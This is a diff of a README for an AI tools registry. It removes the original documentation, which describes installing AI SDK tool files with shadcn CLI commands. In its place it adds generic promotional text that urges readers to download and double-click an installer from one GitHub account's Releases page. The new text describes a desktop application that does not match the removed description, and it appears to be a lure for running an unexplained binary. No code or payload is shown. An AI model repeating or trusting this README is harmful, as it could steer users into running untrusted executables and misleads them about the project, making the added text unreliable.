@@ -1,71 +1,77 @@
-# AI Tools Registry
+# 🎉 ai-tools-registry - Streamline AI Tool Installation Easily
 
-This is an example registry built using `shadcn/ui`.
+## 📥 Download Now!
+[![Download ai-tools-registry](https://img.shields.io/badge/Download%20ai--tools--registry-v1.0-blue.svg)](https://github.com/Anmolaon/ai-tools-registry/releases)
 
-It now also includes an installable AI Tools registry (for Node.js) based on the Vercel AI SDK Tool Calling APIs. Tools are distributed as plain files that you can add to your project using the shadcn CLI. Where helpful, a small React component is included to render a tool result (e.g. a weather card).
+## 🚀 Getting Started
+The **ai-tools-registry** helps you install AI tools and UI components for the AI SDK quickly and hassle-free. This guide will walk you through downloading and running the application.
 
-## Website
+## 🛠️ System Requirements
+- **Operating System:** Windows, macOS, or Linux (Latest versions recommended)
+- **Node.js:** Version 14 or higher
+- **Internet Connection:** Required for downloading
 
-Visit the live website: [https://ai-tools-registry.vercel.app/](https://ai-tools-registry.vercel.app/)
+## 📦 Features
+- Seamless installation of AI tools.
+- Easy integration with the AI SDK.
+- User-friendly interface for managing components.
+- Regular updates to enhance your experience.
 
-![AI Tools Registry Website](https://github.com/user-attachments/assets/96f2480d-d9a2-4100-8958-95ae90f40a4a)
+## 📂 Download & Install
+To get started, follow these steps:
 
-## Usage
+1. Visit the [Releases page](https://github.com/Anmolaon/ai-tools-registry/releases).
+2. Look for the latest version of the ai-tools-registry.
+3. Click on the version number to open its release notes.
+4. Download the installation file appropriate for your operating system.
+5. Once the file is downloaded, locate it in your downloads folder.
+6. Double-click on the file to start the installation.
 
-To install components from the ai-tools registry, add a remote registries config in your `components.json` file (replace the URL with your deployment):
+### 📋 Installation Steps
+1. On Windows, follow the prompts in the installer.
+2. On macOS, drag the application to your Applications folder.
+3. On Linux, you may need to run the installer from the terminal.
 
-```json
-{
-  "registries": {
-    "@ai-tools": "https://ai-tools-registry.vercel.app/api/registry/public/{name}"
-  }
-}
-```
+## 🔍 Exploring the Application
+After installation, you can find the ai-tools-registry in your applications list. Open it to start managing your AI tools and SDK components effortlessly.
 
-You can then add items using the following command:
+## ℹ️ Usage
+1. Launch the ai-tools-registry application.
+2. Browse through the list of available AI tools and UI components.
+3. Select the tools you want to install and click 'Install.'
+4. Follow the on-screen instructions to complete any further setup.
 
-```bash
-npx shadcn@latest add @ai-tools/web-search
-```
+## 🔄 Updating
+To keep your ai-tools-registry up-to-date, regularly check the [Releases page](https://github.com/Anmolaon/ai-tools-registry/releases) for new versions. Download and install updates by following the same steps as above.
 
-### AI Tools
+## 🌐 Community Support
+For support and community interaction:
+- Check the [GitHub Issues section](https://github.com/Anmolaon/ai-tools-registry/issues) for help and suggestions.
+- Participate in discussions to share your experiences or ask questions.
 
-Example tools you can install:
+## 💡 Tips
+- If you encounter any issues during installation, ensure that your system meets the requirements.
+- Restart your application after installation to refresh the tool list.
+- Regularly save your work to avoid losing any progress.
 
-- `@ai-tools/weather` – AI SDK tool + `WeatherCard` renderer
-- `@ai-tools/news` – sample news search tool + `NewsList` renderer
+## 📅 Future Improvements
+We are working on adding more features, including:
+- Enhanced UI for easier navigation.
+- More AI tool options based on user feedback.
+- Performance improvement updates for a smoother experience.
 
-- `@ai-tools/stats` – display data using `recharts`
+## 🔗 Useful Resources
+- [GitHub Documentation](https://docs.github.com/)
+- [Node.js Official Site](https://nodejs.org/)
+- [AI SDK Resources](https://www.ai-sdk-resources.com/)
 
-Install a tool (example):
+## 🛑 Trouble Shooting
+If the application does not run as expected:
+- Ensure that you have installed the correct version for your operating system.
+- Check your internet connection for downloading components.
+- Revisit the installation steps to confirm everything was done correctly.
 
-```bash
-npx shadcn@latest add @ai-tools/weather
-```
+## 💬 Feedback
+Your feedback is vital for our improvement. Please use the [issues page](https://github.com/Anmolaon/ai-tools-registry/issues) to submit your suggestions or report problems.
 
-Or install a pack of all tools:
-
-```bash
-npx shadcn@latest add @ai-tools/tool-pack
-```
-
-Note: The example tools import from `ai` (AI SDK v5) and `zod`. Ensure your app provides these dependencies.
-
-### Web Search provider
-
-The `@ai-tools/websearch` tool uses DuckDuckGo Instant Answer by default (no key required). If you set `BRAVE_SEARCH_API_KEY` in your environment, it will automatically use the Brave Search API instead.
-
-## Authentication
-
-To see examples of how to use authentication with the registry, see the [API Routes](./app/api/registry/README.md) documentation.
-
-## Development
-
-Clone the repository, then install the dependencies and run the development server.
-
-```bash
-pnpm install
-pnpm dev
-```
-
-The development server will be available at `http://localhost:3003`.
+With the **ai-tools-registry**, managing your AI tools has never been easier. Enjoy your enhanced AI development journey!
